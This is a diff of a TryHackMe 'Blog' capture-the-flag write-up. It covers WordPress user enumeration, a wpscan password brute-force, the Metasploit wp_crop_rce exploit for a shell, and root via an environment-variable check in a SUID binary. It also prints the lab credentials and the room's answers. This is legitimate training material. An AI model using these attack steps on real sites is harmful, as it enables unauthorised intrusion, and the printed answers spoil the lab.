@@ -1,127 +1,112 @@
-TryHackMe – Blog 
+# Blog | TryHackMe
 
-0) Preparation
+## Overview
+- **Room:** Blog  
+- **Difficulty:** Medium  
+- **Tags:** WordPress, Gobuster, Wpscan, PrivEsc  
 
-Added to /etc/hosts:
+---
 
-XXXX blog.thm
+## Enumeration
 
-1) Enumeration
+### Nmap
+```bash
+nmap -sC -sV -oN nmap_blog.txt <IP>
+```
 
-Ran an nmap scan:
+**Open Ports:**
+- 22/tcp - SSH  
+- 80/tcp - HTTP  
 
-Open ports: 22 (SSH), 80 (HTTP), 139/445 (SMB)
+---
 
-Detected WordPress version 5.0 on port 80
+### Web Enumeration (Port 80)
+Visited `http://<IP>/` → WordPress blog.  
 
-Checked robots.txt → contained /wp-admin/admin-ajax.php, but nothing useful
+Checked `robots.txt` → nothing useful.  
 
-2) SMB Enumeration
+Ran gobuster:  
+```bash
+gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+```
+Found `/admin`.  
 
-Listed available shares:
+Identified WordPress 5.0 from page source.  
 
-smbclient -N -L XXXX
+---
 
+### User Enumeration
+Checked WordPress API endpoint:  
+```http://<IP>/wp-json/wp/v2/users```  
+Found users: `kwheel`, `bjoel`  
 
-Found share BillySMB.
+---
 
-Connected:
+### WPScan
+```bash
+wpscan --url http://<IP>/ --enumerate u --passwords /usr/share/wordlists/rockyou.txt
+```
+Credentials found:  
+- `kwheel : cutiepie1`  
 
-smbclient //XXXX/BillySMB -N
+---
 
+## Exploitation
 
-Discovered files: Alice-White-Rabbit.jpg, check-this.png, tswift.mp4
+Logged in as `kwheel`.  
 
-Ran enum4linux:
+Tried uploading reverse shell → failed.  
 
-enum4linux -a XXXX
+Switched to Metasploit:  
+```bash
+msfconsole
+search wordpress 5.0
+use exploit/multi/http/wp_crop_rce
+set RHOSTS <IP>
+set TARGETURI /
+set USERNAME kwheel
+set PASSWORD cutiepie1
+set LHOST <your_IP>
+run
+```
+Got shell as `www-data`.  
 
+---
 
-Retrieved system info and usernames.
+## Privilege Escalation
 
-Steghide on Alice-White-Rabbit.jpg returned:
+Ran `linpeas.sh`.  
+Discovered password for user `bjoel`.  
 
-You’ve found yourself in a rabbit hole, friend.
+Also found suspicious binary `checker`.  
+Analyzed with Ghidra → program checks `admin` environment variable.  
 
-
-→ files were rabbit holes.
-
-3) WordPress User Enumeration
-
-Using HackTricks WordPress enumeration technique
-, tested:
-
-/wp-json/wp/v2/users
-
-
-Discovered users: kwheel, bjoel.
-
-4) Password Brute Force
-
-Ran wpscan:
-
-wpscan --url http://blog.thm --enumerate u
-wpscan --url http://blog.thm -U kwheel,bjoel -P /usr/share/wordlists/rockyou.txt
-
-
-Found valid credentials:
-
-kwheel : cutiepie1
-
-5) Exploitation (Metasploit)
-
-Logged in as kwheel.
-
-Attempted manual reverse shell upload but failed.
-
-Switched to Metasploit → used wp_crop_rce (CVE-2019-8942).
-
-Gained reverse shell as www-data.
-
-6) Privilege Escalation
-
-Uploaded and ran linpeas.sh.
-
-Found credentials for bjoel:
-
-LittleYellowLamp90!@
-
-
-Discovered SUID binary /usr/sbin/checker.
-
-Analysis showed it checks for environment variable admin.
-
-If not set → prints "Not admin"
-
-If set → spawns Bash shell as root
-
-Exploited with:
-
+```bash
 export admin=1
 ./checker
+whoami
+root
+```
 
+---
 
-→ Root shell obtained.
+## Flags
+- **User.txt** → `/media/usb/user.txt`  
+- **Root.txt** → `/root/root.txt`  
 
-7) Flags
+---
 
-user.txt:
+## Answers to Room Questions
+1. **What is the WordPress version?** → `5.0`  
+2. **Which users were found via API?** → `kwheel`, `bjoel`  
+3. **What password was cracked for kwheel?** → `cutiepie1`  
+4. **Which binary was exploited for root?** → `checker`  
+5. **Where was the user flag located?** → `/media/usb/user.txt`  
 
-/media/usb/user.txt
+---
 
-
-root.txt:
-
-/root/root.txt
-
-8) Lessons Learned
-
-SMB enumeration with smbclient and enum4linux can quickly reveal files and users.
-
-Not all files are relevant — some are intentional rabbit holes.
-
-Outdated WordPress versions (5.0) are highly vulnerable and exploitable.
-
-wpscan is reliable for brute-forcing WordPress logins.
-
-Privilege escalation often comes from custom SUID binaries — always check them carefully.
+## Lessons Learned
+- WordPress REST API leaks usernames.  
+- WPScan automates brute-forcing WordPress users.  
+- Analyzing binaries with Ghidra helps discover logic flaws.  
+- Environment variable abuse can lead to privilege escalation.  
